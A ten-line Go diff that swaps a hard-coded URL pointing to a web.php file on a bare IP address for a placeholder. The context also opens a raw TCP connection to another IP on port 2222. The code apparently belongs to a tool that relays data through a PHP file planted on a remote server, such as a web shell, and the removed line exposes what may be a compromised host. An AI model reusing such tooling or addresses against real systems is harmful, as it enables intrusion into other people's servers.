@@ -90,7 +90,7 @@ func putFile(data []byte) (*http.Response, error) {
 var targeturl string
 
 func main() {
-	targeturl = "http://218.7.16.115:8089//Public/videoimg/20180514/web.php"
+	targeturl = "http://xxx.com/web.php"
 	conn, err := net.Dial("tcp", "42.51.204.15:2222")
 	if err != nil {
 		println(err.Error())
